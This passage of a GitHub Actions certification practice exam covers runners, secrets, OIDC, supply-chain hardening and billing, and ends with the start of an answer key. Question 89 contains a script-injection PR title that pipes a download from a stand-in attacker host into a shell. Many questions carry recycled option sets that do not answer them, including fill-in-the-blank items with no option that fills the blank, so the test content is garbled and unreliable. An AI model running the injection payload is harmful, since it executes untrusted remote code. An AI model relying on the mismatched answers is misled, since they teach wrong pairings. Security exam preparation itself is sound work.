- **A.** Configure AWS/Azure OIDC trust policies with wildcard `"sub": "repo:*:*"` and store static cloud root keys in plain-text `vars.*` as fallback
- **B.** Set `Repository Settings -> Actions -> General -> Access` on `Internal`/`Private` action repos to `Accessible from repositories in the enterprise` (`or organization`)
- **C.** Disable a workflow (`Actions UI` or `gh workflow disable`) to halt scheduled/webhook runs while preserving `.yml` code and run history, vs deleting `.yml`
- **D.** Assume Organization-level Actions secrets and variables override `production` Environment-level secrets and variables of the same name

### 68. An enterprise architect configures `Actions -> General -> Workflow permissions` at the `kestrelpay` Organization level. To satisfy least-privilege defaults across all newly created repositories AND prevent `GITHUB_TOKEN` from opening or approving pull requests automatically, which two settings should be enforced?

- **A.** Emit `echo "::set-output name=version::1.2.3"` and `echo "::set-env name=FOO::bar"` workflow commands on `ubuntu-24.04` runners
- **B.** Publish to **GitHub Marketplace** from a `Public` single-action repo (`root action.yml`, unique `name`, `branding`, `README`, `2FA`, Marketplace agreement) via a SemVer GitHub Release
- **C.** Reference third-party Marketplace actions using floating `@main` or `@HEAD` branch refs with `permissions: write-all` enabled globally
- **D.** Set `Repository Settings -> Actions -> General -> Access` on `Internal`/`Private` action repos to `Accessible from repositories in the enterprise` (`or organization`)

### 69. Under `Enterprise -> Policies -> Actions`, KestrelPay Clearing selects `Allow select actions and reusable workflows`, checks `Allow actions created by GitHub`, leaves `Allow actions by Marketplace verified creators` unchecked, enters `docker/build-push-action@v6.*`, and checks `Require actions to be pinned to a full-length commit SHA`. What happens when a repo runs `uses: docker/build-push-action@v6.9.0`?

- **A.** Reference third-party Marketplace actions using floating `@main` or `@HEAD` branch refs with `permissions: write-all` enabled globally
- **B.** Configure `runs.using: "node12"` in `action.yml` and gitignore both `dist/` and `node_modules/` so neither exists in the tagged release commit
- **C.** Enforce `Allow select actions and reusable workflows` (`GitHub-created`, `Verified creators`, internal `org/*`), **`Require actions to be pinned to a full-length commit SHA`**, and fork PR approvals
- **D.** Attach persistent stateful self-hosted VMs with internal database credentials directly to `Public` repositories accepting unreviewed fork PRs

### 70. On public SDK repository `kestrelpay/kestrel-sdk-rs`, outside contributors submit pull requests from external forks for the first time. Which `Actions -> General -> Fork pull request workflows from outside contributors` policy protects runners from unreviewed crypto-mining YAML modifications while still letting maintainers approve legitimate PR runs?

- **A.** Enforce `Allow select actions and reusable workflows` (`GitHub-created`, `Verified creators`, internal `org/*`), **`Require actions to be pinned to a full-length commit SHA`**, and fork PR approvals
- **B.** Disable a workflow (`Actions UI` or `gh workflow disable`) to halt scheduled/webhook runs while preserving `.yml` code and run history, vs deleting `.yml`
- **C.** Attach persistent stateful self-hosted VMs with internal database credentials directly to `Public` repositories accepting unreviewed fork PRs
- **D.** No — `on: pull_request_target` runs with base-repo `secrets.*` and write-capable `GITHUB_TOKEN`; checking out and executing untrusted fork PR code leaks secrets immediately

### 71. KestrelPay Clearing's security team hardens enterprise-wide GitHub Actions governance policies across 15 organizations. Which three enterprise/organization policy controls directly mitigate unauthorized action execution and privilege escalation? Select three.

- **A.** Set `Repository Settings -> Actions -> General -> Access` on `Internal`/`Private` action repos to `Accessible from repositories in the enterprise` (`or organization`)
- **B.** Enforce org-default `Read-only` `GITHUB_TOKEN`, grant minimal job-level `permissions:` (`e.g., contents: read, pull-requests: write`), and use short-lived **GitHub App installation tokens** (`not PATs`) for cross-repo calls
- **C.** Configure AWS/Azure OIDC trust policies with wildcard `"sub": "repo:*:*"` and store static cloud root keys in plain-text `vars.*` as fallback
- **D.** Enforce `Allow select actions and reusable workflows` (`GitHub-created`, `Verified creators`, internal `org/*`), **`Require actions to be pinned to a full-length commit SHA`**, and fork PR approvals
- **E.** Reference third-party Marketplace actions using floating `@main` or `@HEAD` branch refs with `permissions: write-all` enabled globally
- **F.** Attach persistent stateful self-hosted VMs with internal database credentials directly to `Public` repositories accepting unreviewed fork PRs

### 72. KestrelPay Clearing runs PCI-scoped integration jobs on self-hosted Linux VMs and wants every VM runner process to accept AT MOST ONE job, exit immediately so orchestrator automation destroys and reimages the VM, and never leave residual `/tmp` credentials for another job. Complete the `./config.sh` registration flag (`____`) or modern REST alternative.

- **A.** Configure `runs.using: "node12"` in `action.yml` and gitignore both `dist/` and `node_modules/` so neither exists in the tagged release commit
- **B.** Attach an Enterprise **Azure Private Network (`VNet`)** configuration directly to standard `ubuntu-latest` free runners or `arm64` macOS Larger runners
- **C.** Attach persistent stateful self-hosted VMs with internal database credentials directly to `Public` repositories accepting unreviewed fork PRs
- **D.** Combine standard/`ubuntu-slim` hosted runners, autoscaling **Larger runners** (static IPs, GPU, high RAM), and ephemeral self-hosted runners (`--ephemeral`, `generate-jitconfig`, Kubernetes `ARC` `gha-runner-scale-set`)

### 73. KestrelPay Clearing needs 32-core / 128 GB RAM Linux builds with static outbound egress IPs without managing Kubernetes or VM patching. Which GitHub-hosted runner tier provides up to 64+ vCPUs, static IP ranges, autoscaling concurrency, and Runner Group assignment?

- **A.** Store mandatory legal compliance binaries and long-term release installers exclusively inside `actions/cache@v4` (`expecting 1-year retention`)
- **B.** Attach persistent stateful self-hosted VMs with internal database credentials directly to `Public` repositories accepting unreviewed fork PRs
- **C.** Combine standard/`ubuntu-slim` hosted runners, autoscaling **Larger runners** (static IPs, GPU, high RAM), and ephemeral self-hosted runners (`--ephemeral`, `generate-jitconfig`, Kubernetes `ARC` `gha-runner-scale-set`)
- **D.** Attach an Enterprise **Azure Private Network (`VNet`)** configuration directly to standard `ubuntu-latest` free runners or `arm64` macOS Larger runners

### 74. KestrelPay Clearing deploys Actions Runner Controller (`ARC`) on internal AKS clusters to autoscale ephemeral container runners from zero for `Private` and `Internal` repositories. Place the enterprise deployment, governance, and firewall steps in the exact order.

- **A.** Deploy deprecated `summerwind` webhook ARC with inbound port 443 open → Skip Runner Group scoping across all org repos → Keep persistent workspaces across unrelated jobs → Disable Kubernetes RBAC
- **B.** Authenticate ARC with a personal developer PAT → Enable `Allow public repositories` on the Runner Group → Mount host `/var/run/docker.sock` across stateful pods → Block `*.actions.githubusercontent.com` and `ghcr.io` on the firewall
- **C.** Create an org GitHub App (`runner` perms) & K8s Secret → Create a Runner Group (`no Public repos`; scoped repos) → Deploy `gha-runner-scale-set` controller + scale set (`min: 0`) → Allow egress to `github.com`, `*.actions...`, and `ghcr.io`
- **D.** Bake `./config.sh` `.runner` files into a VM image cloned across 20 pods → Attach an `arm64` macOS Larger runner to Azure VNet → Store cluster kubeconfigs in plain-text `vars.*` → Ignore queue metrics

### 75. KestrelPay Clearing enables a strict GitHub Enterprise Cloud IP allow list AND wants GitHub-hosted Linux and Windows Larger runners to reach private PostgreSQL servers inside an Azure Virtual Network (`10.24.0.0/16`) without exposing the database publicly. Which Azure delegated subnet resource and runner architecture implement this?

- **A.** Attach an Enterprise **Azure Private Network (`VNet`)** configuration directly to standard `ubuntu-latest` free runners or `arm64` macOS Larger runners
- **B.** Block outbound HTTPS `443` to `pkg.actions.githubusercontent.com` and `ghcr.io` on self-hosted runner firewalls while forcing Immutable Actions
- **C.** Connect Linux/Windows **Larger runners** to **Azure VNets** (`GitHub.Network/networkSettings` + Network Configurations), configure self-hosted `.env` proxies, and allow `pkg.actions.githubusercontent.com` + `ghcr.io`
- **D.** Attach persistent stateful self-hosted VMs with internal database credentials directly to `Public` repositories accepting unreviewed fork PRs

### 76. Self-hosted runners inside KestrelPay Clearing's corporate DMZ sit behind an outbound HTTPS proxy (`http://proxy.kestrel.internal:8443`) and strict egress firewall, and jobs suddenly fail when downloading Immutable Actions. Which two networking configurations are required? Select two.

- **A.** Attach persistent stateful self-hosted VMs with internal database credentials directly to `Public` repositories accepting unreviewed fork PRs
- **B.** Block outbound HTTPS `443` to `pkg.actions.githubusercontent.com` and `ghcr.io` on self-hosted runner firewalls while forcing Immutable Actions
- **C.** Attach **Azure Private Networking** (`GitHub.Network/networkSettings`) to Linux/Windows Larger runners and allow `*.actions.githubusercontent.com` (`pkg.actions...`) + `ghcr.io` on firewalls
- **D.** Attach an Enterprise **Azure Private Network (`VNet`)** configuration directly to standard `ubuntu-latest` free runners or `arm64` macOS Larger runners
- **E.** Configure AWS/Azure OIDC trust policies with wildcard `"sub": "repo:*:*"` and store static cloud root keys in plain-text `vars.*` as fallback
- **F.** Connect Linux/Windows **Larger runners** to **Azure VNets** (`GitHub.Network/networkSettings` + Network Configurations), configure self-hosted `.env` proxies, and allow `pkg.actions.githubusercontent.com` + `ghcr.io`

### 77. KestrelPay Clearing turns on `Enable IP allow list` at the organization level, and standard `ubuntu-latest` GitHub-hosted runner jobs immediately fail `actions/checkout` with IP allow list rejection errors. Which two native options restore runner access without disabling the IP allow list?

- **A.** Connect Linux/Windows **Larger runners** to **Azure VNets** (`GitHub.Network/networkSettings` + Network Configurations), configure self-hosted `.env` proxies, and allow `pkg.actions.githubusercontent.com` + `ghcr.io`
- **B.** Attach an Enterprise **Azure Private Network (`VNet`)** configuration directly to standard `ubuntu-latest` free runners or `arm64` macOS Larger runners
- **C.** Disable a workflow (`Actions UI` or `gh workflow disable`) to halt scheduled/webhook runs while preserving `.yml` code and run history, vs deleting `.yml`
- **D.** Attach persistent stateful self-hosted VMs with internal database credentials directly to `Public` repositories accepting unreviewed fork PRs

### 78. KestrelPay Clearing groups PCI HSM self-hosted runners into Runner Group `pci-hsm-prod`. To guarantee only approved release workflows (`not arbitrary feature-branch YAML edits`) in two PCI repositories can schedule jobs on `pci-hsm-prod`, which two Runner Group restrictions should be enabled together?

- **A.** Assume Organization-level Actions secrets and variables override `production` Environment-level secrets and variables of the same name
- **B.** Attach persistent stateful self-hosted VMs with internal database credentials directly to `Public` repositories accepting unreviewed fork PRs
- **C.** Isolate compute in Enterprise/Org **Runner Groups** (`Selected orgs` -> `Selected repos` -> `Selected workflows`, blocking `Public` repos) and inspect `_diag/Runner_*.log` vs `Worker_*.log`
- **D.** Reference third-party Marketplace actions using floating `@main` or `@HEAD` branch refs with `permissions: write-all` enabled globally

### 79. In `kestrelpay/settlement-gw`, a job specifies `runs-on: { group: pci-hsm-prod, labels: [self-hosted, linux, x64, pkcs11] }` and sits permanently in `Queued — Waiting for a runner to pick up this job`. Which two conditions commonly cause this queue stall? Select two.

- **A.** Emit `echo "::set-output name=version::1.2.3"` and `echo "::set-env name=FOO::bar"` workflow commands on `ubuntu-24.04` runners
- **B.** Attach persistent stateful self-hosted VMs with internal database credentials directly to `Public` repositories accepting unreviewed fork PRs
- **C.** Isolate compute in Enterprise/Org **Runner Groups** (`Selected orgs` -> `Selected repos` -> `Selected workflows`, blocking `Public` repos) and inspect `_diag/Runner_*.log` vs `Worker_*.log`
- **D.** Attach an Enterprise **Azure Private Network (`VNet`)** configuration directly to standard `ubuntu-latest` free runners or `arm64` macOS Larger runners
- **E.** Deploy ephemeral `ARC` (`gha-runner-scale-set`) or Larger runners inside **Runner Groups** restricted to selected orgs, selected repos, and trusted workflow paths (`never Public repos`)
- **F.** No — **Docker container actions** (`runs.using: "docker"`) execute **only on Linux runners** with Docker; cross-OS Linux/Windows/macOS actions require JavaScript (`node20`) or Composite actions

### 80. A Linux self-hosted runner VM in `kestrelpay` reboots after weekly kernel patching, and `./run.sh` fails to restart automatically because an engineer previously started it interactively in `tmux`. Complete the runner directory command `sudo ____ install && sudo ./svc.sh start` that registers the persistent `systemd` service.

- **A.** Isolate compute in Enterprise/Org **Runner Groups** (`Selected orgs` -> `Selected repos` -> `Selected workflows`, blocking `Public` repos) and inspect `_diag/Runner_*.log` vs `Worker_*.log`
- **B.** Store mandatory legal compliance binaries and long-term release installers exclusively inside `actions/cache@v4` (`expecting 1-year retention`)
- **C.** Configure `runs.using: "node12"` in `action.yml` and gitignore both `dist/` and `node_modules/` so neither exists in the tagged release commit
- **D.** Publish to **GitHub Marketplace** from a `Public` single-action repo (`root action.yml`, unique `name`, `branding`, `README`, `2FA`, Marketplace agreement) via a SemVer GitHub Release

### 81. Air-gapped self-hosted runners at KestrelPay Clearing run `actions/setup-python@v5` (`with: python-version: '3.12'`), which tries to download Python from the internet and times out. Complete the pre-populated directory root `$____/Python/3.12.7/x64/` (`with x64.complete`) so `actions/setup-python` resolves locally offline.

- **A.** No — **Docker container actions** (`runs.using: "docker"`) execute **only on Linux runners** with Docker; cross-OS Linux/Windows/macOS actions require JavaScript (`node20`) or Composite actions
- **B.** Configure `runs.using: "node12"` in `action.yml` and gitignore both `dist/` and `node_modules/` so neither exists in the tagged release commit
- **C.** Store mandatory legal compliance binaries and long-term release installers exclusively inside `actions/cache@v4` (`expecting 1-year retention`)
- **D.** Check `actions/runner-images` release notes & `$RUNNER_TOOL_CACHE` (`setup-node`/`setup-python`/`setup-java` resolve cached binaries first or download + cache) vs custom golden images / `container:` jobs

### 82. KestrelPay Clearing's golden-image pipeline builds custom self-hosted Ubuntu 24.04 runner images matching GitHub's official hosted-runner software inventory, or runs preflight hooks before/after every job on self-hosted hosts. Which official open-source repository and runner hook variables support these two requirements?

- **A.** Attach an Enterprise **Azure Private Network (`VNet`)** configuration directly to standard `ubuntu-latest` free runners or `arm64` macOS Larger runners
- **B.** Emit `echo "::set-output name=version::1.2.3"` and `echo "::set-env name=FOO::bar"` workflow commands on `ubuntu-24.04` runners
- **C.** Reference third-party Marketplace actions using floating `@main` or `@HEAD` branch refs with `permissions: write-all` enabled globally
- **D.** Check `actions/runner-images` release notes & `$RUNNER_TOOL_CACHE` (`setup-node`/`setup-python`/`setup-java` resolve cached binaries first or download + cache) vs custom golden images / `container:` jobs

### 83. In `kestrelpay/payments-core`, secret `SETTLEMENT_API_URL` is defined at three levels: Organization (`https://org.kestrel.io`), Repository (`https://repo.kestrel.io`), and Deployment Environment `production` (`https://prod.kestrel.io`). When a job with `environment: production` reads `${{ secrets.SETTLEMENT_API_URL }}`, which value wins?

- **A.** Reference `${{ secrets.DEPLOY_KEY != '' }}` directly inside a workflow-level `on:` filter or unquoted `echo ${{ secrets.DEPLOY_KEY }}` debug step
- **B.** Scope encrypted `secrets.*` (`<=48 KB`, write-only) and plain-text `vars.*` across `Organization`, `Repository`, and `Environment` (`precedence: Environment > Repository > Organization`)
- **C.** Assume Organization-level Actions secrets and variables override `production` Environment-level secrets and variables of the same name
- **D.** Configure AWS/Azure OIDC trust policies with wildcard `"sub": "repo:*:*"` and store static cloud root keys in plain-text `vars.*` as fallback

### 84. Platform engineers at KestrelPay Clearing separate sensitive credentials from non-sensitive deployment region names and check GitHub Actions storage limits. Which two statements about `secrets.*` and `vars.*` are accurate? Select two.

- **A.** Emit `echo "::set-output name=version::1.2.3"` and `echo "::set-env name=FOO::bar"` workflow commands on `ubuntu-24.04` runners
- **B.** Assume Organization-level Actions secrets and variables override `production` Environment-level secrets and variables of the same name
- **C.** Reference `${{ secrets.DEPLOY_KEY != '' }}` directly inside a workflow-level `on:` filter or unquoted `echo ${{ secrets.DEPLOY_KEY }}` debug step
- **D.** Attach persistent stateful self-hosted VMs with internal database credentials directly to `Public` repositories accepting unreviewed fork PRs
- **E.** Scope sensitive credentials via `Environment > Repository > Organization` `secrets.*` (`encrypted via LibSodium on REST API`) and store plain-text parameters in `vars.*`
- **F.** Scope encrypted `secrets.*` (`<=48 KB`, write-only) and plain-text `vars.*` across `Organization`, `Repository`, and `Environment` (`precedence: Environment > Repository > Organization`)

### 85. KestrelPay Clearing's HashiCorp Vault rotation job calls `PUT /repos/kestrelpay/ledger-api/actions/secrets/HSM_PIN` via the GitHub REST API. Before sending `encrypted_value` and `key_id`, how MUST the rotation client encrypt the plaintext secret?

- **A.** Configure AWS/Azure OIDC trust policies with wildcard `"sub": "repo:*:*"` and store static cloud root keys in plain-text `vars.*` as fallback
- **B.** Manage secrets & variables programmatically via REST API (`encrypting secrets client-side with LibSodium crypto_box_seal against .../public-key`) or `gh secret set` / `gh variable set`
- **C.** Emit `echo "::set-output name=version::1.2.3"` and `echo "::set-env name=FOO::bar"` workflow commands on `ubuntu-24.04` runners
- **D.** Assume Organization-level Actions secrets and variables override `production` Environment-level secrets and variables of the same name

### 86. A security auditor calls `GET /orgs/kestrelpay/actions/secrets/MASTER_SIGNING_KEY` with an `admin:org` token hoping to verify the current secret value by comparing plaintext strings. What does GitHub's Actions Secrets REST API return on `GET`?

- **A.** Disable a workflow (`Actions UI` or `gh workflow disable`) to halt scheduled/webhook runs while preserving `.yml` code and run history, vs deleting `.yml`
- **B.** Manage secrets & variables programmatically via REST API (`encrypting secrets client-side with LibSodium crypto_box_seal against .../public-key`) or `gh secret set` / `gh variable set`
- **C.** Reference third-party Marketplace actions using floating `@main` or `@HEAD` branch refs with `permissions: write-all` enabled globally
- **D.** Reference `${{ secrets.DEPLOY_KEY != '' }}` directly inside a workflow-level `on:` filter or unquoted `echo ${{ secrets.DEPLOY_KEY }}` debug step

---

## Domain 5 — Secure and optimize automation (10–15% official weight · 14 questions)

### 87. KestrelPay Clearing configures Deployment Environment `production` in `kestrelpay/payments-core` so that `(1)` the engineer who triggered the workflow run CANNOT approve their own deployment, `(2)` only tags matching `v*.*.*` may deploy, and `(3)` an external Change Advisory webhook must approve before `secrets.*` unlock. Which Environment protection rules implement all three?

- **A.** Attach persistent stateful self-hosted VMs with internal database credentials directly to `Public` repositories accepting unreviewed fork PRs
- **B.** Reference third-party Marketplace actions using floating `@main` or `@HEAD` branch refs with `permissions: write-all` enabled globally
- **C.** Gate deployments with **Environments** (`Required reviewers`, `Prevent self-review`, `Wait timer`, `Selected branches/tags`, **Custom deployment protection rules**) and vet Marketplace actions (`Verified creator`, source & SHA audit)
- **D.** Assume Organization-level Actions secrets and variables override `production` Environment-level secrets and variables of the same name

### 88. Before permitting a third-party GitHub Marketplace action inside `kestrelpay/ledger-api`, your AppSec checklist inspects the Marketplace listing badge, repository source, and transitive runtime behavior. Does a Marketplace `Verified creator` badge guarantee that floating tag `@v2` is immune to tag retargeting or transitive `npm` compromises?

- **A.** Configure `runs.using: "node12"` in `action.yml` and gitignore both `dist/` and `node_modules/` so neither exists in the tagged release commit
- **B.** Reference third-party Marketplace actions using floating `@main` or `@HEAD` branch refs with `permissions: write-all` enabled globally
- **C.** Publish to **GitHub Marketplace** from a `Public` single-action repo (`root action.yml`, unique `name`, `branding`, `README`, `2FA`, Marketplace agreement) via a SemVer GitHub Release
- **D.** Gate deployments with **Environments** (`Required reviewers`, `Prevent self-review`, `Wait timer`, `Selected branches/tags`, **Custom deployment protection rules**) and vet Marketplace actions (`Verified creator`, source & SHA audit)

### 89. In `kestrelpay/payments-core`, a triage workflow validates PR titles using `run: echo "Checking ${{ github.event.pull_request.title }}"`. An attacker opens a fork PR titled `"; curl -s https://evil.example/exfil | sh #`. Proposed solution: Wrap `${{ github.event.pull_request.title }}` in double quotes directly inside the `run:` shell string. Does this meet the goal?

- **A.** Evaluate `${{ ... }}` built-in functions (`contains`, `startsWith`, `format`, `join`, `toJSON`, `fromJSON`, `hashFiles`), separating parse-time keys from runtime step contexts
- **B.** Prevent **script injection** by never interpolating untrusted `${{ github.event.* }}` (`PR title/body, branch head_ref, issue comment`) directly inside `run:`—bind via `env:` (`PR_TITLE: ${{ ... }}`) and quote `"$PR_TITLE"`
- **C.** No — interpolating `${{ github.event.pull_request.title }}` (`or head_ref / comment.body`) directly inside `run:` allows shell command injection; bind it to an `env:` variable first
- **D.** Yes — the proposed configuration satisfies every stated GitHub Actions functional, security, and operational requirement

### 90. KestrelPay Clearing maintains a public SDK repo where maintainer labels on external fork PRs post automated benchmark comments. Which two patterns prevent script injection AND `pull_request_target` secret exfiltration (`"pwn requests"`)? Select two.

- **A.** Attach persistent stateful self-hosted VMs with internal database credentials directly to `Public` repositories accepting unreviewed fork PRs
- **B.** No — `on: pull_request_target` runs with base-repo `secrets.*` and write-capable `GITHUB_TOKEN`; checking out and executing untrusted fork PR code leaks secrets immediately
- **C.** No — interpolating `${{ github.event.pull_request.title }}` (`or head_ref / comment.body`) directly inside `run:` allows shell command injection; bind it to an `env:` variable first
- **D.** Prevent **script injection** by never interpolating untrusted `${{ github.event.* }}` (`PR title/body, branch head_ref, issue comment`) directly inside `run:`—bind via `env:` (`PR_TITLE: ${{ ... }}`) and quote `"$PR_TITLE"`
- **E.** Reference third-party Marketplace actions using floating `@main` or `@HEAD` branch refs with `permissions: write-all` enabled globally
- **F.** Pass untrusted `github.event.*` text (`PR titles, branch names, comments`) through intermediate `env:` variables (`never raw ${{ ... }} inside run:`) and never checkout untrusted forks in `pull_request_target`

### 91. Workflow `release-sync.yml` in `kestrelpay/ledger-api` needs to open an automated version-bump PR in sibling private repository `kestrelpay/helm-charts` AND trigger `ci.yml` on that PR without tying authentication to an employee's personal account. Which token architecture follows GitHub's enterprise least-privilege model?

- **A.** Attach persistent stateful self-hosted VMs with internal database credentials directly to `Public` repositories accepting unreviewed fork PRs
- **B.** Assume Organization-level Actions secrets and variables override `production` Environment-level secrets and variables of the same name
- **C.** Enforce org-default `Read-only` `GITHUB_TOKEN`, grant minimal job-level `permissions:` (`e.g., contents: read, pull-requests: write`), and use short-lived **GitHub App installation tokens** (`not PATs`) for cross-repo calls
- **D.** Configure AWS/Azure OIDC trust policies with wildcard `"sub": "repo:*:*"` and store static cloud root keys in plain-text `vars.*` as fallback

### 92. A release workflow in `kestrelpay/card-router` contains three jobs: `lint`, `test`, and `publish-ghcr`. You set workflow-level `permissions: contents: read` and add `permissions: { contents: read, packages: write }` ONLY on job `publish-ghcr`. When does `GITHUB_TOKEN` expire, and can `publish-ghcr` push commits to another repository?

- **A.** Reference third-party Marketplace actions using floating `@main` or `@HEAD` branch refs with `permissions: write-all` enabled globally
- **B.** Enforce org-default `Read-only` `GITHUB_TOKEN`, grant minimal job-level `permissions:` (`e.g., contents: read, pull-requests: write`), and use short-lived **GitHub App installation tokens** (`not PATs`) for cross-repo calls
- **C.** Disable a workflow (`Actions UI` or `gh workflow disable`) to halt scheduled/webhook runs while preserving `.yml` code and run history, vs deleting `.yml`
- **D.** Emit `echo "::set-output name=version::1.2.3"` and `echo "::set-env name=FOO::bar"` workflow commands on `ubuntu-24.04` runners

### 93. KestrelPay Clearing replaces static AWS IAM access keys in `kestrelpay/settlement-gw` with GitHub Actions OIDC (`token.actions.githubusercontent.com`). Complete the AWS IAM role trust condition checking the OIDC JWT subject claim so ONLY jobs bound to Deployment Environment `production` in `kestrelpay/settlement-gw` can assume the role: `"token.actions.githubusercontent.com:sub": "____"`.

- **A.** Eliminate static cloud keys with **OIDC** (`permissions: id-token: write`), validating `iss` (`https://token.actions.githubusercontent.com`), `aud`, and strict `sub` / `job_workflow_ref` claims in AWS/Azure/GCP/Vault
- **B.** Assume Organization-level Actions secrets and variables override `production` Environment-level secrets and variables of the same name
- **C.** Configure AWS/Azure OIDC trust policies with wildcard `"sub": "repo:*:*"` and store static cloud root keys in plain-text `vars.*` as fallback
- **D.** Reference `${{ secrets.DEPLOY_KEY != '' }}` directly inside a workflow-level `on:` filter or unquoted `echo ${{ secrets.DEPLOY_KEY }}` debug step

### 94. KestrelPay Clearing migrates `kestrelpay/ledger-api` production Azure deployments from expiring client secrets to passwordless OpenID Connect (`OIDC`) gated by manual approval. Place the environment, cloud trust, workflow permission, and runtime exchange steps in the exact order.

- **A.** Run deploy on `pull_request_target` checking out untrusted fork PR code → Set `permissions: write-all` globally → Request OIDC tokens before Environment reviewers approve → Print cloud tokens to `$GITHUB_STEP_SUMMARY`
- **B.** Save a static OIDC JWT inside `secrets.OIDC_JWT` once a month → Disable TLS verification on cloud login steps → Skip `aud` validation in Vault → Allow developers to self-approve their own `production` runs
- **C.** Set cloud OIDC trust `sub` to wildcard `repo:*:*` → Omit `permissions: id-token: write` on the job → Leave `environment:` unset while expecting reviewer gates to pause → Store static cloud root keys in `vars.*`
- **D.** Gate `production` Environment (`reviewers`, `main`) → Pin cloud OIDC `aud` & `sub: repo:<o>/<r>:environment:production` → Set `environment: production` & `id-token: write` → Exchange OIDC JWT at runtime & purge static keys

### 95. KestrelPay Clearing generates cryptographically signed SLSA build provenance for `ghcr.io/kestrelpay/ledger-api@sha256:88f4...` using `actions/attest-build-provenance` (`backed by Sigstore`) and verifies provenance in its Kubernetes admission gate. Complete the two required job permissions (`id-token: write` and `____: write`) and CLI verification flag (`gh attestation verify oci://... -R kestrelpay/ledger-api ____ ...`).

- **A.** Pin actions to **40-char commit SHAs** (`aligned with Immutable Actions`) and generate/verify **SLSA Artifact Attestations** (`actions/attest-build-provenance` / `actions/attest@v4` + `gh attestation verify`)
- **B.** Reference third-party Marketplace actions using floating `@main` or `@HEAD` branch refs with `permissions: write-all` enabled globally
- **C.** Store mandatory legal compliance binaries and long-term release installers exclusively inside `actions/cache@v4` (`expecting 1-year retention`)
- **D.** Configure AWS/Azure OIDC trust policies with wildcard `"sub": "repo:*:*"` and store static cloud root keys in plain-text `vars.*` as fallback

### 96. Why does pinning `uses: third-party/deploy-action@v3` fail supply-chain immutability audits compared to `uses: third-party/deploy-action@e94f2a8c1b03d44e5f6a7b8c9d0e1f2a3b4c5d6e`, even if `@v3` worked cleanly last month?

- **A.** Publish to **GitHub Marketplace** from a `Public` single-action repo (`root action.yml`, unique `name`, `branding`, `README`, `2FA`, Marketplace agreement) via a SemVer GitHub Release
- **B.** Configure `runs.using: "node12"` in `action.yml` and gitignore both `dist/` and `node_modules/` so neither exists in the tagged release commit
- **C.** Pin actions to **40-char commit SHAs** (`aligned with Immutable Actions`) and generate/verify **SLSA Artifact Attestations** (`actions/attest-build-provenance` / `actions/attest@v4` + `gh attestation verify`)
- **D.** Reference third-party Marketplace actions using floating `@main` or `@HEAD` branch refs with `permissions: write-all` enabled globally

### 97. KestrelPay Clearing's Actions storage bill spikes because debug core dumps (`upload-artifact@v4`) default to the organization's `90-day` retention period even though developers only inspect them for 48 hours. Which two controls shrink artifact storage consumption immediately and prospectively?

- **A.** Store mandatory legal compliance binaries and long-term release installers exclusively inside `actions/cache@v4` (`expecting 1-year retention`)
- **B.** No — in `actions/upload-artifact@v4`, artifacts are **immutable** once uploaded; two matrix jobs uploading the exact same artifact `name:` fail with a `409 Conflict` unless uniquely named (`e.g., app-${{ matrix.os }}`)
- **C.** Accelerate builds with `actions/cache@v4` (`hashFiles` keys + `restore-keys` fallback) and lower storage spend via `retention-days` + REST API org/repo artifact & log retention caps
- **D.** Emit `echo "::set-output name=version::1.2.3"` and `echo "::set-env name=FOO::bar"` workflow commands on `ubuntu-24.04` runners

### 98. In `kestrelpay/monorepo`, `npm ci` runs for 6 minutes on every PR even when `package-lock.json` is unchanged or only `README.md` was edited. Which two workflow optimizations cut execution latency and storage overhead? Select two.

- **A.** Enable `concurrency: { cancel-in-progress: true }` on PR branches, cache dependencies with `actions/cache@v4`, lower `retention-days`, and prefer Linux (`1x`) over macOS (`10x`)
- **B.** No — in `actions/upload-artifact@v4`, artifacts are **immutable** once uploaded; two matrix jobs uploading the exact same artifact `name:` fail with a `409 Conflict` unless uniquely named (`e.g., app-${{ matrix.os }}`)
- **C.** Accelerate builds with `actions/cache@v4` (`hashFiles` keys + `restore-keys` fallback) and lower storage spend via `retention-days` + REST API org/repo artifact & log retention caps
- **D.** Store mandatory legal compliance binaries and long-term release installers exclusively inside `actions/cache@v4` (`expecting 1-year retention`)
- **E.** Emit `echo "::set-output name=version::1.2.3"` and `echo "::set-env name=FOO::bar"` workflow commands on `ubuntu-24.04` runners
- **F.** Define a YAML anchor `&shared_steps` inside `.github/workflows/base.yml` and reference `*shared_steps` directly inside a separate `.github/workflows/deploy.yml` file

### 99. KestrelPay Clearing runs a cross-platform CLI smoke test (`10 minutes` wall-clock per OS) on standard GitHub-hosted `ubuntu-latest`, `windows-latest`, and `macos-latest` runners for every trivial commit, plus lightweight JSON lint jobs. How do standard per-minute billing multipliers compare across Linux, Windows, and macOS, and which lightweight Linux runner label lowers minute cost for small non-Docker tasks?

- **A.** Store mandatory legal compliance binaries and long-term release installers exclusively inside `actions/cache@v4` (`expecting 1-year retention`)
- **B.** Attach persistent stateful self-hosted VMs with internal database credentials directly to `Public` repositories accepting unreviewed fork PRs
- **C.** Cut runner spend with `concurrency: { cancel-in-progress: true }`, path filters, Linux (`1x`) / `ubuntu-slim` over Windows (`2x`) / macOS (`10x`), lean matrices (`exclude`), and `timeout-minutes` caps
- **D.** Attach an Enterprise **Azure Private Network (`VNet`)** configuration directly to standard `ubuntu-latest` free runners or `arm64` macOS Larger runners

### 100. Engineers at KestrelPay Clearing push 5 rapid fixup commits in 3 minutes to an open PR, spawning `5 x 24 = 120` concurrent matrix jobs across the organization. Which two YAML changes cut wasted runner minutes by >75% on active feature branches?

- **A.** Assume Organization-level Actions secrets and variables override `production` Environment-level secrets and variables of the same name
- **B.** Cut runner spend with `concurrency: { cancel-in-progress: true }`, path filters, Linux (`1x`) / `ubuntu-slim` over Windows (`2x`) / macOS (`10x`), lean matrices (`exclude`), and `timeout-minutes` caps
- **C.** Disable a workflow (`Actions UI` or `gh workflow disable`) to halt scheduled/webhook runs while preserving `.yml` code and run history, vs deleting `.yml`
- **D.** Reference third-party Marketplace actions using floating `@main` or `@HEAD` branch refs with `permissions: write-all` enabled globally

---

## Answer Key and Explanations

### Question 1 — `D` (Author and manage workflows)

Correct answer: D (is correct). No — `on: schedule` (`POSIX cron` in UTC, minimum 5-minute interval) fires ONLY from workflow files present on the repository's default branch (`main`), so a cron workflow committed solely to `release/v4` never executes automatically. [Skill 1.1: Configure workflows for scheduled, manual, and webhook events | Study Guide: https://learn.microsoft.com/en-us/credentials/certifications/resources/study-guides/gh-200 | Reference: GitHub Actions Documentation (https://docs.github.com/en/actions/writing-workflows/choosing-when-your-workflow-runs/events-that-trigger-workflows)]

- **A:** Incorrect. Disabling a workflow stops runaway `schedule`/`webhook` triggers immediately without losing historical run logs or deleting repository source files.
